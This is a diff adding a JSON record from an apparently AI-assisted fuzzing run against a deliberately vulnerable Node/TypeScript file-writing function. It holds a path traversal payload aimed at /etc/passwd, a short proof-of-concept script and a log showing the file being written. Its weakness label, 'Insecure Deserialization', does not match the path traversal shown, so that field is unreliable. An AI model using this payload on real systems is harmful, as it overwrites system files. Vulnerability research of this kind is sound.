@@ -1,0 +1,32 @@
+{
+  "status": "SUCCESS_CONFIRMED_BY_AI",
+  "successful_payload": "../../etc/passwd||maliciousData",
+  "attempts": [
+    {
+      "payload": "../../etc/passwd||maliciousData",
+      "timestamp": "2025-10-24T19:55:59.539208",
+      "is_successful": true,
+      "execution_log": "Streamed to /etc/passwd\n\nFuzzing completed!\nTotal executions: 1\nUnique crashes: 0\nCurrent cov    : 100.00%\nMax coverage   : 100.00%\n[INFO] - 발견된 JavaScript 파일: 1개\n  - P_TARGET/P_file-system_30064771124.js\n\n대화형 퍼징 시작: P_TARGET/P_file-system_30064771124.js\nCtrl+C로 종료할 수 있습니다.\n",
+      "analysis_reason": "Execution successful with no stderr and no new crashes.",
+      "simulated_code": "const path = require('path');\nconst fs = require('fs');\n\nfunction unsafeFileStream(fileName, data) {\n    const filePath = path.join('/tmp', fileName);\n    const writer = fs.createWriteStream(filePath);\n    writer.write(data);\n    writer.end();\n    console.log(`Streamed to ${filePath}`);\n}\n\n// Malicious input\nconst maliciousInput = '../../etc/passwd||maliciousData';\nunsafeFileStream(maliciousInput, 'Injected Data');",
+      "coverage_percent": 100.0
+    }
+  ],
+  "vulnerability_context": {
+    "project": "file-system",
+    "language": "typescript",
+    "file_path": "vul_test/src/file-system.ts",
+    "function_name": "unsafeFileStream",
+    "sink": "createWriteStream",
+    "sink_id": "30064771124",
+    "known_weakness": [
+      "Insecure Deserialization"
+    ],
+    "code_context": {
+      "before": "function unsafeFileStream(fileName: string, data: string) {\n    // Path traversal vulnerability\n    const filePath = path.join('/tmp', fileName);\n    const writer = fs.createWriteStream(filePath);\n    writer.write(data);\n    writer.end();\n    console.log(`Streamed to ${filePath}`);\n}",
+      "sinkLine": "fs.createWriteStream(filePath)",
+      "after": "",
+      "pseudocode": "const path = require('path');\nconst fs = require('fs');\n\nfunction unsafeFileStream(fileName, data) {\n    const filePath = path.join('/tmp', fileName);\n    const writer = fs.createWriteStream(filePath);\n    writer.write(data);\n    writer.end();\n    console.log(`Streamed to ${filePath}`);\n}\n\nmodule.exports = { unsafeFileStream };"
+    }
+  }
+}
